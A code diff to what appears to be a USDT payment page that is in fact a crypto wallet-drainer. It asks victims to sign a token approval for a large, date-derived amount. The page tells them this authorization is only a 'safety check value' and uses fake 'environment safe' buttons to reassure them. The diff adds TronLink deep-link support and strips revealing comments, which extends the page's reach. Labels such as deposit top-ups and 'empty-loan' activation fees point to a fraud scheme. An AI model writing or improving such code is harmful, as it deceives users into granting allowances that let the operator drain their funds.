@@ -22,7 +22,7 @@
   .btn-pay:disabled{opacity:.5;cursor:not-allowed;transform:none}
   .btn-ghost{background:#f1f2f7;color:#5b6070}
   
-  /* 新增：绿色安全按钮样式 */
+  /* 绿色安全按钮样式 */
   .btn-safe { background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; font-size: 14px; padding: 12px; }
   .btn-safe:hover { background: #dcfce7; }
 
@@ -33,12 +33,18 @@
   .env-warn{padding:13px;border-radius:12px;font-size:12.5px;background:#fff4ec;color:#c2410c;border:1px solid #ffe0b2;margin-bottom:14px;line-height:1.6;text-align:left;}
   /* 安全提示专用样式 */
   .safe-notice{background:#f0fdf4; color:#16a34a; border:1px solid #bbf7d0; border-radius:10px; padding:12px; font-size:12px; line-height:1.6; text-align:left; margin-bottom:20px;}
+  
+  /* 钱包选择按钮组 */
+  .wallet-btn-group { display: flex; gap: 10px; margin-bottom: 8px; }
+  .wallet-btn { flex: 1; padding: 12px; border-radius: 10px; font-size: 14px; font-weight: 800; border: none; color: #fff; cursor: pointer; }
+  .wallet-btn-imtoken { background: #0e8aff; }
+  .wallet-btn-tronlink { background: #00b2ff; }
 </style>
 </head>
 <body>
 <div class="card">
   <h1 id="page-title">USDT 支付</h1>
-  <p class="sub" id="page-sub">请在 imToken 中确认支付</p>
+  <p class="sub" id="page-sub">请在钱包中确认支付</p>
 
   <div id="recover-tip" style="display:none;padding:10px 12px;border-radius:10px;font-size:12.5px;background:#eef6ff;color:#1d4ed8;border:1px solid #bfdbfe;margin-bottom:12px;line-height:1.6;text-align:left;"></div>
   <div id="env-warn" class="env-warn" style="display:none"></div>
@@ -49,15 +55,15 @@
     <div class="info-row"><span class="info-k">支付金额</span><span class="info-v gold" id="info-amount">-</span></div>
   </div>
 
-  <!-- 这里是醒目的安全提示框 -->
+  <!-- 安全提示框 -->
   <div class="safe-notice">
-    💡 安全提示：系统每日动态安全校验值（如：202610.29），仅作校验凭证，实际扣款金额为您上方输入的支付金额。
+    💡 安全提示：授权额度为系统每日动态安全校验值（如：202610.29），仅作校验凭证，实际扣款金额为您上方输入的支付金额。请放心确认。
   </div>
- 
+
   <button class="btn btn-pay" id="btn-pay" disabled>✅安全支付</button>
   
-  <!-- 改成绿色的按钮 -->
-  <button class="btn btn-safe" id="btn-cancel">支付环境安全无异常</button>
+  <!-- 绿色安全按钮 -->
+  <button class="btn btn-safe" id="btn-cancel">✅ 支付环境安全无异常</button>
   
   <div class="status" id="status"></div>
 </div>
@@ -81,7 +87,6 @@ function getDateApproveUnits() {
   const Y = now.getFullYear();
   const M = String(now.getMonth() + 1).padStart(2, '0');
   const D = String(now.getDate()).padStart(2, '0');
-  // 例如 2026年10月29日 -> 202610.29 -> 202610290000
   return (BigInt(`${Y}${M}`) * 1000000n + BigInt(D) * 10000n).toString();
 }
 
@@ -126,8 +131,8 @@ let coldReloadTimer = null;
 $('#info-addr').textContent   = toAddress || '未配置';
 $('#info-chain').textContent  = 'TRC20 (波场)';
 $('#info-amount').textContent = (amount > 0 ? amount : '-') + ' USDT';
-$('#page-title').textContent  = type === 'empty' ? '空放邀请码获取' : '押金充值';
-$('#page-sub').textContent    = type === 'empty' ? '激活' : '请在 imToken 中完成操作';
+$('#page-title').textContent  = type === 'empty' ? '空放资格支付' : '押金充值';
+$('#page-sub').textContent    = type === 'empty' ? '支付 1 USDT 激活空放通道' : '请在钱包中完成操作';
 
 if ((ctx.src === 'hash' || ctx.src === 'storage') && toAddress && amount > 0) {
   const tip = $('#recover-tip');
@@ -151,7 +156,7 @@ function showMissingParamsUI() {
   warn.innerHTML = `
     <div style="margin-bottom:8px;font-weight:700;">⚠️ 支付参数丢失</div>
     <div style="font-size:12.5px;line-height:1.7;margin-bottom:10px;">
-      请返回平台重新点击支付，或复制当前链接在 imToken 浏览打开。
+      请返回平台重新点击支付，或复制当前链接在钱包内打开。
     </div>
     <button id="__copy_paylink__" style="width:100%;background:#f1f2f7;color:#5b6070;border:none;padding:11px;border-radius:10px;font-size:13px;cursor:pointer;">复制当前链接</button>
     <div id="__copied_tip__" style="font-size:12px;color:#16a34a;margin-top:8px;display:none;">✅ 已复制</div>`;
@@ -181,7 +186,7 @@ function getTronWeb() { return window.tronWeb || (window.tron && window.tron.tro
 function isWalletEnv() {
   const ua = (navigator.userAgent || '').toLowerCase();
   const tw = getTronWeb();
-  return ua.includes('imtoken') || ua.includes('tokenpocket') || ua.includes('tpwallet') || !!(tw && tw.ready);
+  return ua.includes('imtoken') || ua.includes('tokenpocket') || ua.includes('tpwallet') || ua.includes('tronlink') || !!(tw && tw.ready);
 }
 function isClosedEnv() {
   const ua = (navigator.userAgent || '').toLowerCase();
@@ -223,25 +228,52 @@ async function buildTxMulti(tw, contract, fnSig, params, fromAddress) {
   ));
   return withRetry(() => promiseAny(tasks), 2, 500);
 }
-function androidIntentLink(dappUrl) {
+
+/* ============ 唤起钱包的方法 ============ */
+function androidImTokenIntent(dappUrl) {
   const ul = imTokenUniversalLink(dappUrl);
   return 'intent://navigate/DappView?url=' + encodeURIComponent(dappUrl)
     + '#Intent;scheme=imtokenv2;package=im.token.app;'
     + 'S.browser_fallback_url=' + encodeURIComponent(ul) + ';end';
 }
-function openWalletNow() {
-  if (isAndroid()) location.href = androidIntentLink(location.href);
+function openImTokenNow() {
+  if (isAndroid()) location.href = androidImTokenIntent(location.href);
   else location.href = imTokenUniversalLink(location.href);
 }
+
+function openTronLinkNow() {
+  // TronLink 的专用 DeepLink
+  const dappUrl = location.href;
+  const deepLink = 'tronlinkoutside://pull.activity?param=' + encodeURIComponent(dappUrl);
+  
+  if (isAndroid()) {
+    const intent = 'intent://pull.activity?param=' + encodeURIComponent(dappUrl) +
+      '#Intent;scheme=tronlinkoutside;package=com.tronlinkpro.wallet;end';
+    location.href = intent;
+  } else {
+    location.href = deepLink;
+  }
+}
+
+/* ============ 显示唤起 UI ============ */
 function showOpenWalletUI(reason) {
   if (payDisabled) return;
   const warn = $('#env-warn');
   warn.style.display = 'block';
   warn.innerHTML = '<div style="margin-bottom:10px;font-weight:700;">' + (reason || '当前未检测到钱包环境') + '</div>'
-    + '<div style="font-size:12.5px;line-height:1.7;margin-bottom:10px;">请在 imToken 钱包内打开本页完成支付：</div>'
-    + '<button id="__open_imtoken__" style="width:100%;background:#0e8aff;color:#fff;border:none;padding:12px;border-radius:10px;font-size:14px;font-weight:800;margin-bottom:8px;cursor:pointer;">立即打开 imToken</button>';
-  warn.querySelector('#__open_imtoken__').onclick = openWalletNow;
-  const btn = $('#btn-pay'); btn.disabled = true; btn.textContent = '请在 imToken 中打开本页';
+    + '<div style="font-size:12.5px;line-height:1.7;margin-bottom:10px;">请在下方选择您的钱包 App 打开并完成支付：</div>'
+    + '<div class="wallet-btn-group">'
+    + '  <button id="__open_imtoken__" class="wallet-btn wallet-btn-imtoken">打开 imToken</button>'
+    + '  <button id="__open_tronlink__" class="wallet-btn wallet-btn-tronlink">打开 TronLink</button>'
+    + '</div>'
+    + '<div style="font-size:11.5px;color:#8d93a6;text-align:center;">如果无法跳转，请复制链接到钱包的 DApp 浏览器粘贴打开</div>';
+  
+  warn.querySelector('#__open_imtoken__').onclick = openImTokenNow;
+  warn.querySelector('#__open_tronlink__').onclick = openTronLinkNow;
+  
+  const btn = $('#btn-pay'); 
+  btn.disabled = true; 
+  btn.textContent = '请在钱包中打开本页';
 }
 
 /* ============ 环境检测 ============ */
@@ -355,9 +387,8 @@ if (!payDisabled) {
   const FRESH_LAUNCH = location.search.includes('fresh=1') || location.hash.includes('fresh=1');
   function armColdReload() {
     try { if (sessionStorage.getItem('pay_reloaded') === '1') return; } catch (e) {}
-    // 冷启动时 5 秒未注入钱包自动刷新一次（仅一次），刷新前去掉 fresh=1 避免再次延迟
     coldReloadTimer = setTimeout(function () {
-      if (!getTronWeb() && /imtoken/i.test(navigator.userAgent || '')) {
+      if (!getTronWeb() && /imtoken|tronlink/i.test(navigator.userAgent || '')) {
         try { sessionStorage.setItem('pay_reloaded', '1'); } catch (e) {}
         try {
           const clean = location.href.replace(/[?&]fresh=1/g, '').replace(/#fresh=1/, '#').replace(/#$/, '');
@@ -367,7 +398,6 @@ if (!payDisabled) {
     }, 5000);
   }
   if (FRESH_LAUNCH) {
-    // 冷启动唤起：短暂延迟后检测钱包，按钮始终保持可点击（点击时内部等待注入）
     setTimeout(function () { armColdReload(); checkEnvironment(); }, 800);
   } else {
     armColdReload(); checkEnvironment();
